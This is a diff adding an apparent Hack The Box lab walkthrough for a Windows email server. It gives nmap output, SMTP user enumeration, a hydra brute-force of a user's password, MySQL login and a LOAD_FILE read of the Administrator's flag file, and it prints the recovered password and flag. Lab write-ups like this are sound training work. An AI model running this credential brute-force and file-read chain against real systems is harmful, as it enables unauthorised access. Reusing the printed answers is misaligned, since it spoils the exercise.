@@ -4,5 +4,85 @@ We were informed that a flag had been placed somewhere on each server to prove s
 HTB{...}
 Our task is to review the security of each of the three servers and present it to the customer. According to our information, the first server is a server that manages emails, customers, and their files.
 
+okay so were going to be dealing with email services of some sort. so we will start out with the ol faithful nmap 
+
+1) sudo nmap -sCV -A 10.129.192.90  -> oh boy...... 
+
+Output : 
+sudo nmap -sCV -A 10.129.192.90
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-01 14:01 CST
+Nmap scan report for 10.129.192.90
+Host is up (0.0082s latency).
+Not shown: 993 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp
+| fingerprint-strings: 
+|   GenericLines: 
+|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
+|     Command unknown, not supported or not allowed...
+|     Command unknown, not supported or not allowed...
+|   Help: 
+|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
+|     214-The following commands are implemented
+|     USER PASS ACCT QUIT PORT RETR
+|     STOR DELE RNFR PWD CWD CDUP
+|     NOOP TYPE MODE STRU
+|     LIST NLST HELP FEAT UTF8 PASV
+|     MDTM REST PBSZ PROT OPTS CCC
+|     XCRC SIZE MFMT CLNT ABORT
+|     HELP command successful
+|   NULL: 
+|_    220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
+25/tcp   open  smtp          hMailServer smtpd
+| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
+|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
+| http-title: Welcome to XAMPP
+|_Requested resource was http://10.129.192.90/dashboard/
+443/tcp  open  ssl/https
+| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
+| Not valid before: 2022-04-21T19:27:17
+|_Not valid after:  2032-04-18T19:27:17
+587/tcp  open  smtp          hMailServer smtpd
+| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.5.5-10.4.24-MariaDB
+|   Thread ID: 11
+|   Capabilities flags: 63486
+|   Some Capabilities: LongColumnFlag, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, ConnectWithDatabase, ODBCClient, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, InteractiveClient, SupportsLoadDataLocal, SupportsCompression, FoundRows, Support41Auth, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
+|   Status: Autocommit
+|   Salt: |Vxvj1S16^Vul;#95>yg
+|_  Auth Plugin Name: mysql_native_password
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: WIN-EASY
+|   NetBIOS_Domain_Name: WIN-EASY
+|   NetBIOS_Computer_Name: WIN-EASY
+|   DNS_Domain_Name: WIN-EASY
+|   DNS_Computer_Name: WIN-EASY
+|   Product_Version: 10.0.17763
+
+
+so we have a lot to work with here.. 
+
+2) tried to FTP with anonymous and hydra nad no luck 
+3) move onto SMTP -> smtp-user-enum -M RCPT -U user.list -D inlanefreight.htb -t 10.129.192.90
+4) 10.129.192.90: fiona@inlanefreight.htb exists
+5) hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt -t 64 -f 10.129.192.90 smtp
+6) password is 987654321
+7) mysql -u fiona -p987654321 -h 10.129.192.90
+8) show databases;
+9) show variables like "secure_file_priv";
+9.a) This step is specific to determining whether the LOAD_FILE() function can be used effectively. The secure_file_priv variable specifies the directory (or directories) from which files can be loaded using functions like LOAD_FILE().
+9.b) If this value is empty, files can be loaded from any location. If it has a specific path, you can only load files from that directory. Knowing this ensures your next step (LOAD_FILE()) is properly scoped.
+10) SELECT LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt");
+10.a) After confirming through secure_file_priv that file loading is possible and the directory allows access, this command attempts to read the contents of the flag.txt file on the target system.
+10.b) You guessed correctly that flags in HTB are often stored in the Administrator user's Desktop directory.
+11) HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
+
 
 
